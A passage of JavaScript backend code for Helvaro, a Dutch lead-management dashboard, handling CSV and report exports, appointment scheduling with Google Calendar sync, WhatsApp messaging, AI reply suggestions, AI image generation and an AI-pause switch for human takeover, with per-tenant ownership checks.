        if (ownProject !== targetProjectCode) {
          return res.status(403).json({ error: 'Lead behoort niet tot de opgegeven projectCode' });
        }

        let conversationHistory = [];
        const stored = record.fields?.['Conversation History'];
        if (stored) { try { conversationHistory = JSON.parse(stored); } catch {} }

        console.log(`[erasure] action=export id=${id} projectCode=${targetProjectCode} actor=admin ts=${new Date().toISOString()}`);
        return res.status(200).json({
          ok: true,
          data: { id: record.id, fields: record.fields || {}, conversationHistory }
        });
      } catch (err) {
        console.error('[leads] lead-export error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── A2. csv-export. Download all leads for this client as CSV ──────────
    // body: { mode: 'csv-export' }
    // Returns text/csv with UTF-8 BOM (so Excel renders accents correctly).
    if (body.mode === 'csv-export') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        // Fetch all leads for this project. Paginate manually if >100
        const all = [];
        let offset = '';
        for (let page = 0; page < 20; page++) {  // hard cap 2000 leads
          const formula = encodeURIComponent(`{Project Code}="${escapeFormula(projectCode)}"`);
          const url = `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}?filterByFormula=${formula}&pageSize=100&sort%5B0%5D%5Bfield%5D=Created%20At&sort%5B0%5D%5Bdirection%5D=desc${offset ? `&offset=${encodeURIComponent(offset)}` : ''}`;
          const r = await atFetch(url, { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } });
          if (!r.ok) break;
          const d = await r.json();
          all.push(...(d.records || []));
          if (!d.offset) break;
          offset = d.offset;
        }
        // Build CSV. Guard against formula injection, quote fields, escape
        // internal quotes by doubling them
        const csvEscape = (v) => {
          const s = csvFormulaGuard(String(v == null ? '' : v))
            .replace(/\r?\n/g, ' ').replace(/"/g, '""');
          return `"${s}"`;
        };
        const headers = ['Datum', 'Naam', 'Telefoon', 'Bron', 'Status', 'Gekwalificeerd', 'Lead Score', 'Ability', 'Urgency', 'Fit', 'Samenvatting', 'Reden', 'Booking Sent', 'Opgepikt', 'Verwachte Waarde', 'Notities'];
        const rows = [headers.map(csvEscape).join(',')];
        for (const rec of all) {
          const f = rec.fields || {};
          rows.push([
            f['Created At'] || '', f['Name'] || '', f['Phone'] || '', f['Bron'] || '',
            f['Conversation State'] || '', f['Qualified'] ? 'ja' : 'nee',
            f['Lead Score'] || '', f['Ability'] || '', f['Urgency'] || '', f['Fit'] || '',
            f['AI Summary'] || '', f['Reason'] || '',
            f['Booking Link Sent'] ? 'ja' : 'nee', f['Opgepikt'] ? 'ja' : 'nee',
            f['Verwachte Waarde'] || '', f['Notities'] || ''
          ].map(csvEscape).join(','));
        }
        const csv = '﻿' + rows.join('\r\n');  // BOM for Excel
        const ts  = new Date().toISOString().slice(0, 10);
        res.setHeader('Content-Type', 'text/csv; charset=utf-8');
        res.setHeader('Content-Disposition', `attachment; filename="helvaro-leads-${projectCode}-${ts}.csv"`);
        return res.status(200).send(csv);
      } catch (err) {
        console.error('[csv-export] error:', err.message);
        return res.status(500).json({ error: 'Export mislukt' });
      }
    }

    // ── A3. report-summary — ROI / value reporting for the dashboard's
    // "Resultaten" panel and the weekly client email. Aggregates ONLY what
    // Airtable already contains for the requested period, plus the same
    // figures for the PREVIOUS equivalent period (so the caller can show a
    // trend delta). Client-session-authenticated and Project-Code-scoped
    // like every other mode in this file.
    //
    // Honest-numbers rules (non-negotiable, see REPORTING-SUMMARY.md):
    //   - Never invent/extrapolate/project revenue.
    //   - "Verwachte Waarde" is a client-entered ESTIMATE. Reported as
    //     pipeline/expected value, never as revenue. Leads with no estimate
    //     are excluded from both the sum and the average (never treated as
    //     €0, which would silently deflate the average).
    //   - Lead score / response time averages exclude records where the
    //     field is absent, not treat missing as zero.
    //
    // body: { mode: 'report-summary', period: 'this_month' | 'last_30_days' | 'all_time' }
    if (body.mode === 'report-summary') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const period = ['this_month', 'last_30_days', 'all_time'].includes(body.period) ? body.period : 'this_month';
      try {
        // Fetch ALL leads for this project. Same pagination pattern + hard
        // cap as csv-export / the main GET path (20 pages * 100 = 2000 leads).
        const all = [];
        let offset = '';
        for (let page = 0; page < 20; page++) {
          const formula = encodeURIComponent(`{fldSmczuyUJd26HLe}="${escapeFormula(projectCode)}"`);
          const url = `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}?filterByFormula=${formula}&pageSize=100${offset ? `&offset=${encodeURIComponent(offset)}` : ''}`;
          const r = await atFetch(url, { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } });
          if (!r.ok) break;
          const d = await r.json();
          all.push(...(d.records || []));
          if (!d.offset) break;
          offset = d.offset;
        }

        const bounds   = reportPeriodBounds(period);
        const current  = aggregateReportPeriod(all, bounds.currentStart, bounds.currentEnd);
        const previous = bounds.hasPrevious ? aggregateReportPeriod(all, bounds.previousStart, bounds.previousEnd) : null;

        return res.status(200).json({
          ok: true,
          period,
          periodLabel: bounds.label,
          current: {
            ...current,
            from: new Date(bounds.currentStart).toISOString(),
            to:   new Date(bounds.currentEnd).toISOString()
          },
          previous: previous ? {
            ...previous,
            from: new Date(bounds.previousStart).toISOString(),
            to:   new Date(bounds.previousEnd).toISOString()
          } : null
        });
      } catch (err) {
        console.error('[report-summary] error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── credit-usage: client-facing usage bar data ─────────────────────────
    // body: { mode: 'credit-usage' }
    // Returns { active:false } (nothing to render — inert/unconfigured) or a
    // full summary. Never errors the dashboard: any credit-system problem
    // just means the widget stays hidden, same fail-open contract as
    // everywhere else in _credits.js.
    if (body.mode === 'credit-usage') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const summary = await credits.getUsageSummary(projectCode);
      return res.status(200).json(summary);
    }

    // ── plan-status: client-facing trial/expiry banner data ────────────────
    // body: { mode: 'plan-status' }
    // Returns { show:false } when the client's plan needs no banner (active,
    // or blank Plan Status — the fail-open default every pre-trial client
    // has), or { show:true, status:'trial'|'expired', daysLeft, trialEndsAt }
    // otherwise. 'cancelled'/'paused' also return show:false here — the
    // dashboard banner spec (TRIAL-DESIGN.md's touchpoint table) only covers
    // trial/expired; api/whatsapp.js and api/cron-followup.js still treat
    // cancelled/paused as service-stopped independently of this banner.
    // Never errors the dashboard: any problem just means the banner stays
    // hidden, same fail-open contract as credit-usage above.
    if (body.mode === 'plan-status') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      try {
        const formula = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
        const cRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}?filterByFormula=${formula}&maxRecords=1`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!cRes.ok) return res.status(200).json({ show: false });
        const cData = await cRes.json();
        const rec = (cData.records || [])[0];
        if (!rec) return res.status(200).json({ show: false });

        const planState = getPlanState(rec.fields || {});
        if (planState.status !== 'trial' && planState.status !== 'expired') {
          return res.status(200).json({ show: false });
        }
        return res.status(200).json({
          show: true,
          status: planState.status,
          daysLeft: planState.daysLeft,
          trialEndsAt: planState.trialEndsAt,
        });
      } catch (err) {
        console.warn('[plan-status] failed, hiding banner:', err.message);
        return res.status(200).json({ show: false });
      }
    }

    // ── APPOINTMENTS — custom calendar (vervangt Calendly) ────────────────
    // body: { mode: 'appointments-list', from?: ISO, to?: ISO }
    // Returnt alle afspraken voor deze klant binnen het bereik (default = volgende 30 dagen).
    if (body.mode === 'appointments-list') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const APPOINTMENTS_TABLE = 'tblD058vEITs1xYFc';
      const from = body.from || new Date(Date.now() - 7*24*60*60*1000).toISOString();
      const to   = body.to   || new Date(Date.now() + 30*24*60*60*1000).toISOString();
      const formula = encodeURIComponent(
        `AND({Project Code}="${escapeFormula(projectCode)}", IS_AFTER({Start Time}, "${from}"), IS_BEFORE({Start Time}, "${to}"))`
      );
      try {
        const r = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}?filterByFormula=${formula}&pageSize=100&sort%5B0%5D%5Bfield%5D=Start+Time&sort%5B0%5D%5Bdirection%5D=asc`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!r.ok) return res.status(500).json({ error: 'Airtable fout' });
        const d = await r.json();
        return res.status(200).json({ appointments: d.records || [] });
      } catch (err) {
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // body: { mode: 'appointment-create', startTime, duration?, leadId?, leadName?, leadPhone?, notes? }
    if (body.mode === 'appointment-create') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const APPOINTMENTS_TABLE = 'tblD058vEITs1xYFc';
      if (!body.startTime) return res.status(400).json({ error: 'startTime ontbreekt' });
      const dt = new Date(body.startTime);
      if (isNaN(dt.getTime())) return res.status(400).json({ error: 'Ongeldige startTime' });
      const apptId = `${projectCode}-${dt.getUTCFullYear().toString().slice(-2)}${String(dt.getUTCMonth()+1).padStart(2,'0')}${String(dt.getUTCDate()).padStart(2,'0')}${String(dt.getUTCHours()).padStart(2,'0')}${String(dt.getUTCMinutes()).padStart(2,'0')}`;
      const fields = {
        'Appointment ID': apptId,
        'Start Time':     body.startTime,
        'Duration':       parseInt(body.duration) || 30,
        'Project Code':   projectCode,
        'Lead Name':      String(body.leadName || '').slice(0, 100),
        'Lead Phone':     String(body.leadPhone || '').slice(0, 30),
        'Status':         'booked',
        'Source':         'manual',
        'Notes':          String(body.notes || '').slice(0, 2000),
        'Created At':     new Date().toISOString()
      };
      if (body.leadId && /^rec[A-Za-z0-9]{14}$/.test(body.leadId)) {
        // SECURITY: verify the lead belongs to this client before linking it
        // to the new appointment — same ownership check as PATCH and
        // appointment-update above. Without this, any authenticated client
        // could link an appointment to another tenant's lead just by
        // guessing/enumerating a record ID.
        try {
          const leadCheck = await atFetch(
            `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${body.leadId}`,
            { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
          );
          if (!leadCheck.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
          const leadData = await leadCheck.json();
          const leadProject = leadData.fields?.['fldSmczuyUJd26HLe'] || leadData.fields?.['Project Code'] || '';
          if (leadProject !== projectCode) {
            return res.status(403).json({ error: 'Geen toegang tot deze lead' });
          }
        } catch (err) {
          console.error('[appointment-create] lead ownership check failed:', err.message);
          return res.status(500).json({ error: 'Serverfout' });
        }
        fields['Lead'] = [body.leadId];
      }
      try {
        const r = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}`,
          {
            method:  'POST',
            headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
            body:    JSON.stringify({ fields, typecast: true })
          }
        );
        const d = await r.json();
        if (!r.ok) return res.status(500).json({ error: d.error?.message || 'Aanmaken mislukt' });

        // ── Booking confirmation (fail-soft, template-gated) ────────────────
        // Dashboard-created appointments (Source: 'manual') have no guarantee
        // the lead has messaged recently — Meta's 24h customer-service window
        // may well be closed, unlike the AI in-chat booking path
        // (api/whatsapp.js), which sends a freeform confirmation because
        // it's mid-conversation. Gated exactly like cron-followup.js's
        // follow-up loop: only send through an approved template, and NEVER
        // let a confirmation failure break the appointment that was just
        // created (the request already succeeded above).
        const leadPhoneForConfirm = String(fields['Lead Phone'] || '').trim();
        if (leadPhoneForConfirm) {
          await sendAppointmentConfirmation({
            airtableToken: AIRTABLE_TOKEN, baseId: BASE_ID, clientsTable: CLIENTS_TABLE,
            projectCode, phone: leadPhoneForConfirm, leadName: fields['Lead Name'], startTime: body.startTime
          }).catch(err => console.error('[appointment-create] confirmation mislukt (afspraak blijft geldig):', err.message));
        }

        // Mirror into the client's Google Calendar (best-effort, non-blocking).
        // The appointment already exists in Airtable at this point — a Google
        // failure here must never surface as an appointment-create failure.
        let googleEventId = '';
        try {
          const { token, calId } = await gcalAccessForProject(projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE);
          if (token) {
            const ev = await _gcal.createEvent(token, calId, {
              summary:     `Afspraak: ${fields['Lead Name'] || 'lead'} (Helvaro)`,
              description: `Telefoon: ${fields['Lead Phone'] || ''}\nProject: ${projectCode}\n${fields['Notes'] || ''}`,
              startISO:    body.startTime,
              durationMin: fields['Duration'],
            });
            if (ev.ok && ev.eventId) {
              googleEventId = ev.eventId;
              await atFetch(`https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}/${d.id}`, {
                method:  'PATCH',
                headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
                body:    JSON.stringify({ fields: { 'Google Event ID': ev.eventId }, typecast: true })
              }).catch(() => {});
            } else if (!ev.ok) {
              console.error('[gcal] create mirror failed:', ev.error);
            }
          }
        } catch (e) { console.error('[gcal] create mirror exception:', e && e.message); }

        return res.status(200).json({ ok: true, id: d.id, apptId, googleEventId });
      } catch (err) {
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // body: { mode: 'appointment-update', id, status?, startTime?, duration?, notes? }
    if (body.mode === 'appointment-update') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const APPOINTMENTS_TABLE = 'tblD058vEITs1xYFc';
      const id = String(body.id || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(id)) return res.status(400).json({ error: 'Ongeldig record ID' });
      // Cross-tenant security check. Haal eerst record op en verifieer Project Code
      let existingFields = {};
      try {
        const chkR = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}/${id}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!chkR.ok) return res.status(404).json({ error: 'Afspraak niet gevonden' });
        const existing = await chkR.json();
        existingFields = existing.fields || {};
        if (existingFields['Project Code'] !== projectCode) {
          return res.status(403).json({ error: 'Geen toegang tot deze afspraak' });
        }
      } catch (err) {
        return res.status(500).json({ error: 'Serverfout' });
      }
      const updateFields = {};
      if (body.status !== undefined && ['booked', 'completed', 'no_show', 'cancelled', 'rescheduled'].includes(body.status)) {
        updateFields['Status'] = body.status;
      }
      if (body.startTime !== undefined) {
        updateFields['Start Time'] = body.startTime;
        // Rescheduled -> the lead must be reminded about the NEW time.
        // cron-followup.js's reminder query filters on NOT({Reminder Sent}), so
        // leaving the flag set would permanently exclude this appointment and the
        // lead would silently never hear about the change. Clearing it re-arms the
        // 24h reminder for the new slot. (Sending a second reminder for a genuinely
        // rescheduled appointment is correct behaviour, not a duplicate.)
        updateFields['Reminder Sent'] = false;
      }
      if (body.duration  !== undefined) updateFields['Duration']   = parseInt(body.duration) || 30;
      if (body.notes     !== undefined) updateFields['Notes']      = String(body.notes).slice(0, 2000);
      if (Object.keys(updateFields).length === 0) return res.status(400).json({ error: 'Niets om bij te werken' });
      try {
        const r = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${APPOINTMENTS_TABLE}/${id}`,
          {
            method:  'PATCH',
            headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
            body:    JSON.stringify({ fields: updateFields, typecast: true })
          }
        );
        if (!r.ok) return res.status(500).json({ error: 'Update mislukt' });
        const d = await r.json();

        // Sync the change into the client's Google Calendar (best-effort). The
        // Airtable update already succeeded — a Google failure here must never
        // surface as an update failure to the caller.
        try {
          const gEventId = existingFields['Google Event ID'];
          if (gEventId) {
            const { token, calId } = await gcalAccessForProject(projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE);
            if (token) {
              if (updateFields['Status'] === 'cancelled') {
                await _gcal.deleteEvent(token, calId, gEventId);
              } else if (updateFields['Start Time'] || updateFields['Duration']) {
                await _gcal.updateEvent(token, calId, gEventId, {
                  summary:     `Afspraak: ${existingFields['Lead Name'] || 'lead'} (Helvaro)`,
                  description: `Telefoon: ${existingFields['Lead Phone'] || ''}\nProject: ${projectCode}`,
                  startISO:    updateFields['Start Time'] || existingFields['Start Time'],
                  durationMin: updateFields['Duration']   || existingFields['Duration'] || 30,
                });
              }
            }
          }
        } catch (e) { console.error('[gcal] update sync failed:', e && e.message); }

        return res.status(200).json({ ok: true, record: d });
      } catch (err) {
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── B. Test-message. Send a one-off WhatsApp to a phone number ─────────
    // body: { mode: 'test-message', phone: '32466358427', message: '...' }
    if (body.mode === 'test-message') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      let phone = String(body.phone || '').replace(/[\s\-\(\)\.]/g, '');
      if      (phone.startsWith('00')) phone = phone.slice(2);
      else if (phone.startsWith('+'))  phone = phone.slice(1);
      else if (phone.startsWith('0'))  phone = '32' + phone.slice(1);
      if (!/^\d{8,15}$/.test(phone))   return res.status(400).json({ error: 'Ongeldig telefoonnummer' });
      const message = String(body.message || '').trim().slice(0, 2000);
      if (!message) return res.status(400).json({ error: 'Bericht is leeg' });

      // Per-tenant daily quota. See isTestMessageQuotaExceeded() above.
      if (isTestMessageQuotaExceeded(projectCode)) {
        return res.status(429).json({ error: `Dagelijkse limiet van ${TEST_MSG_DAILY_LIMIT} test-berichten bereikt voor jouw account. Probeer morgen opnieuw.` });
      }

      // Per-client sender number (multitenancy prep): blank on every client
      // today, in which case this resolves to '' and we fall back to the
      // shared env var below — identical to pre-change behaviour.
      const clientPnid      = await getClientWaPhoneNumberId(projectCode, AIRTABLE_TOKEN, BASE_ID, CLIENTS_TABLE);
      const PHONE_NUMBER_ID = clientPnid || process.env.PHONE_NUMBER_ID;
      const WHATSAPP_TOKEN  = process.env.WHATSAPP_TOKEN;
      if (!PHONE_NUMBER_ID || !WHATSAPP_TOKEN) {
        return res.status(500).json({ error: 'WhatsApp configuratie ontbreekt op de server' });
      }
      try {
        const waRes = await fetch(`https://graph.facebook.com/v19.0/${PHONE_NUMBER_ID}/messages`, {
          method:  'POST',
          headers: { Authorization: `Bearer ${WHATSAPP_TOKEN}`, 'Content-Type': 'application/json' },
          body:    JSON.stringify({ messaging_product: 'whatsapp', to: phone, type: 'text', text: { body: message } })
        });
        const waData = await waRes.json().catch(() => ({}));
        if (!waRes.ok || waData.error) {
          console.error('[test-message] WA failed:', JSON.stringify(waData.error || waData).slice(0, 300));
          return res.status(502).json({ error: waData.error?.message || 'WhatsApp versturen mislukt' });
        }
        return res.status(200).json({ ok: true, sentTo: phone });
      } catch (err) {
        return res.status(500).json({ error: 'Netwerkfout. Probeer opnieuw' });
      }
    }

    // ── B2. suggest-replies. AI generates 3 short WhatsApp reply ideas ─────
    // POST { mode: 'suggest-replies', leadId: 'recXXX' }
    // Reads the lead's Conversation History, sends to Claude with the client's
    // AI Name + Client Name + AI Instructions, returns 3 short Dutch replies.
    if (body.mode === 'suggest-replies') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const leadId = String(body.leadId || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(leadId)) return res.status(400).json({ error: 'Ongeldig lead ID' });
      const ANTHROPIC_KEY = process.env.ANTHROPIC_API_KEY;
      if (!ANTHROPIC_KEY) return res.status(503).json({ error: 'AI niet beschikbaar' });
      // Discretionary AI (unlike whatsapp.js's lead conversation, this is a
      // manual "give me ideas" click, not the lead-reply promise itself) —
      // BLOCK when the client is over their credit limit. Fails open on any
      // credit-infra problem (missing fields, Airtable down) — see
      // _credits.js's header.
      const creditCheck = await credits.checkCredits(projectCode, credits.FEATURES.REPLY_SUGGESTION);
      if (!creditCheck.allowed) {
        return res.status(402).json({ error: 'credit_limit_reached', message: creditCheck.message });
      }
      try {
        // Fetch the lead. Verify ownership + read history
        const lRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${leadId}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!lRes.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        const lead = await lRes.json();
        if ((lead.fields?.['fldSmczuyUJd26HLe'] || lead.fields?.['Project Code']) !== projectCode) {
          return res.status(403).json({ error: 'Geen toegang' });
        }
        let history = [];
        const stored = lead.fields?.['Conversation History'];
        if (stored) { try { history = JSON.parse(stored); } catch {} }
        const leadName = lead.fields?.['fldbk0LVNckOU0bqA'] || lead.fields?.['Name'] || '';
        // Look up the client's AI config (cached client may already have it)
        let aiName = 'Mathis', clientName2 = clientName || 'het bedrijf', aiInstr = '';
        try {
          const formula2 = encodeURIComponent(`{fldN4dL0bGgfBOXwM}="${escapeFormula(projectCode)}"`);
          const cRes2 = await atFetch(
            `https://api.airtable.com/v0/${BASE_ID}/${CLIENTS_TABLE}?filterByFormula=${formula2}&maxRecords=1`,
            { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
          );
          if (cRes2.ok) {
            const cd = await cRes2.json();
            const rec = (cd.records || [])[0];
            if (rec) {
              aiName      = rec.fields['fldRvoe1JMPOtPWC7'] || rec.fields['AI Name']         || aiName;
              clientName2 = rec.fields['fldAnB848Sr5jl6dq'] || rec.fields['Client Name']     || clientName2;
              aiInstr     = rec.fields['fld1lqHctRbqFGQf5'] || rec.fields['AI Instructions'] || '';
            }
          }
        } catch {}
        // Build the prompt
        const convText = history.slice(-12).map(m => {
          const role = m.role === 'user' ? 'Klant' : (m.manual ? 'Jij eerder' : 'AI eerder');
          return role + ': ' + String(m.content || '').slice(0, 500);
        }).join('\n');
        const sysPrompt =
          'Je bent ' + aiName + ' van ' + clientName2 + '. Je helpt de salesmedewerker met 3 verschillende, korte WhatsApp-antwoorden die ze nu naar de lead "' + (leadName || 'de lead') + '" zou kunnen sturen. ' +
          (aiInstr ? 'Volg deze stijl-regels: ' + aiInstr.slice(0, 800) + ' ' : '') +
          'Antwoord ALLEEN met geldig JSON: {"replies":["...","...","..."]}. Elk antwoord max 200 tekens. Antwoorden zijn verschillend van toon (bv. Vriendelijk / direct / vraag-stellend). Geen uitleg buiten de JSON.';
        const aiRes = await fetch('https://api.anthropic.com/v1/messages', {
          method:  'POST',
          headers: { 'x-api-key': ANTHROPIC_KEY, 'anthropic-version': '2023-06-01', 'Content-Type': 'application/json' },
          body:    JSON.stringify({
            model:      'claude-haiku-4-5-20251001',
            max_tokens: 600,
            system:     sysPrompt,
            messages:   [{ role: 'user', content: 'Recente gespreksgeschiedenis:\n\n' + (convText || '(nog geen berichten)') }]
          })
        });
        if (!aiRes.ok) {
          const t = await aiRes.text().catch(() => '');
          console.error('[suggest-replies] anthropic failed', aiRes.status, t.slice(0, 300));
          return res.status(502).json({ error: 'AI niet bereikbaar' });
        }
        const ad = await aiRes.json();
        const txt = ad.content?.[0]?.text || '';
        let parsed = null;
        try { parsed = JSON.parse(txt); } catch {
          // Tolerant: extract first {...} block
          const m = txt.match(/\{[\s\S]*\}/);
          if (m) { try { parsed = JSON.parse(m[0]); } catch {} }
        }
        const replies = (parsed && Array.isArray(parsed.replies)) ? parsed.replies.filter(s => typeof s === 'string').slice(0, 3) : [];
        if (!replies.length) return res.status(502).json({ error: 'AI gaf geen suggesties terug' });
        credits.recordUsage(projectCode, credits.FEATURES.REPLY_SUGGESTION, {
          credits: credits.WEIGHTS[credits.FEATURES.REPLY_SUGGESTION],
          tokens: (ad.usage && (ad.usage.input_tokens || 0) + (ad.usage.output_tokens || 0)) || null,
          meta: { leadId },
        }).catch(() => {});
        return res.status(200).json({ replies });
      } catch (err) {
        console.error('[suggest-replies] error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── B3. Phase 4 — AI property images (api/_images.js). Folded into this
    // route's existing mode-dispatch (no new route file — see vercel.json's
    // 11-route budget and api/_images.js's own header for why this pattern,
    // not the __gcal-style rewrite, was used). Three modes: property-styles
    // (static list), property-list (this client's saved gallery), and
    // property-generate (the actual OpenAI call — credit-gated, AI-labelled).
    if (body.mode === 'property-styles') {
      // No tenant-specific data, but every mode in this file requires an
      // authenticated client context — matches the rest of the file's
      // posture even though the payload itself is the same for everyone.
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      return res.status(200).json({ styles: images.PROPERTY_STYLES.map((s) => ({ key: s.key, label: s.label })) });
    }

    if (body.mode === 'property-list') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const list = await images.listPropertyImages(projectCode);
      return res.status(200).json({ images: list });
    }

    if (body.mode === 'property-generate') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });

      const style = String(body.style || '').trim();
      if (!images.isValidStyleKey(style)) {
        return res.status(400).json({ error: `Ongeldige stijl. Kies uit: ${images.PROPERTY_STYLES.map((s) => s.key).join(', ')}` });
      }
      const customPrompt = body.customPrompt !== undefined ? String(body.customPrompt).trim().slice(0, 500) : '';

      // Validate the upload BEFORE touching credits or OpenAI — never trust
      // client-supplied filename/MIME, only the actual base64 payload (see
      // api/_images.js's parseImageDataUrl). Cap is 3MB decoded, NOT the
      // VPS reference's 10MB — see parseImageDataUrl's/MAX_UPLOAD_BYTES's
      // own comment in api/_images.js for why: this transport is a base64
      // JSON body against Vercel's ~4.5MB platform request-size limit, not
      // vps's multipart stream. The dashboard downscales client-side so
      // this is invisible to the user in practice.
      let uploaded;
      try {
        uploaded = images.parseImageDataUrl(body.dataUrl);
      } catch (err) {
        if (err instanceof images.ImageFeatureError) return res.status(err.status).json({ error: err.message });
        return res.status(400).json({ error: 'Ongeldige afbeelding' });
      }

      // Fail soft, clearly, BEFORE any credit check or paid call — a missing
      // OPENAI_API_KEY/BLOB_READ_WRITE_TOKEN must never surface as a 500 or
      // break the dashboard (task requirement).
      if (!images.isConfigured()) {
        return res.status(503).json({ error: images.missingConfigMessage() });
      }

      // Discretionary AI (marketing tool, not the lead-conversation promise
      // whatsapp.js protects) — BLOCK when over the credit limit, BEFORE the
      // OpenAI call is made. Fails open on any credit-infra problem — see
      // _credits.js's header. Same 402 shape as suggest-replies above.
      const creditCheck = await credits.checkCredits(projectCode, credits.FEATURES.IMAGE_GENERATION);
      if (!creditCheck.allowed) {
        return res.status(402).json({ error: 'credit_limit_reached', message: creditCheck.message });
      }

      try {
        const generated = await images.generatePropertyImage({
          imageBuffer: uploaded.buffer,
          imageMimeType: uploaded.mimeType,
          style,
          customPrompt,
        });
        const blobUrl = await images.uploadPropertyImageToBlob(generated.buffer, generated.mimeType, projectCode, 'result');
        if (!blobUrl) return res.status(502).json({ error: 'AI-beeld gegenereerd maar opslaan mislukt. Probeer opnieuw.' });

        // buildImageRecord() is the ONLY place aiLabel is set — see
        // api/_images.js's file header. Persisted (best-effort, fail-soft)
        // AND returned to the caller carry the exact same object.
        const record = images.buildImageRecord({ url: blobUrl, style, customPrompt });
        images.appendPropertyImage(projectCode, record).catch(() => {});

        credits.recordUsage(projectCode, credits.FEATURES.IMAGE_GENERATION, {
          credits: credits.WEIGHTS[credits.FEATURES.IMAGE_GENERATION],
          meta: { style },
        }).catch(() => {});

        return res.status(200).json({ ok: true, image: record });
      } catch (err) {
        if (err instanceof images.ImageFeatureError) return res.status(err.status).json({ error: err.message });
        console.error('[property-generate] error:', err.message);
        return res.status(500).json({ error: 'Serverfout bij AI-beeldgeneratie. Probeer later opnieuw.' });
      }
    }

    // ── C0. AI pause / resume — human takeover for a lead's WhatsApp thread ──
    // POST { mode: 'ai-pause',  leadId: 'recXXX' }
    // POST { mode: 'ai-resume', leadId: 'recXXX' }
    // The flag lives inside the lead's existing Notities JSON envelope
    // (fldoLRI5W12ThTls7) rather than a new Airtable field — same mechanism
    // api/form.js's flagWaFailed / api/whatsapp.js's mergeWaFailedFlag already
    // use for waFailed. api/whatsapp.js's processMessage() reads this flag
    // (getAiPauseInfo) on every inbound message and skips runAI() while it's
    // set — see its own doc comment there for the full contract.
    if (body.mode === 'ai-pause' || body.mode === 'ai-resume') {
      if (!projectCode) return res.status(403).json({ error: 'Geen client context' });
      const leadId = String(body.leadId || '').trim();
      if (!/^rec[A-Za-z0-9]{14}$/.test(leadId)) return res.status(400).json({ error: 'Ongeldig record ID' });

      try {
        // Ownership check — identical pattern to every other lead mutation
        // in this file (PATCH above, appointment-create, mode C below).
        const lRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${leadId}`,
          { headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}` } }
        );
        if (!lRes.ok) return res.status(404).json({ error: 'Lead niet gevonden' });
        const lead = await lRes.json();
        const leadProject = lead.fields?.['fldSmczuyUJd26HLe'] || lead.fields?.['Project Code'] || '';
        if (leadProject !== projectCode) return res.status(403).json({ error: 'Geen toegang tot deze lead' });

        const pausing = body.mode === 'ai-pause';
        const rawNotities = lead.fields?.['fldoLRI5W12ThTls7'] || lead.fields?.['Notities'] || '';
        const mergedNotities = mergeNotitiesPatch(rawNotities, {
          aiPaused: pausing ? { at: new Date().toISOString(), by: clientName || 'dashboard' } : undefined
        });

        const uRes = await atFetch(
          `https://api.airtable.com/v0/${BASE_ID}/${LEADS_TABLE}/${leadId}`,
          {
            method:  'PATCH',
            headers: { Authorization: `Bearer ${AIRTABLE_TOKEN}`, 'Content-Type': 'application/json' },
            body:    JSON.stringify({ fields: { fldoLRI5W12ThTls7: mergedNotities } })
          }
        );
        if (!uRes.ok) return res.status(500).json({ error: 'Opslaan mislukt. Probeer later opnieuw.' });

        return res.status(200).json({ ok: true, aiPaused: pausing });
      } catch (err) {
        console.error('[leads ai-pause/resume] error:', err.message);
        return res.status(500).json({ error: 'Serverfout' });
      }
    }

    // ── C. Existing: send a WhatsApp reply on an existing lead (2-way chat) ─
    // POST /api/leads?id=recXXX  body: { message: "text" }
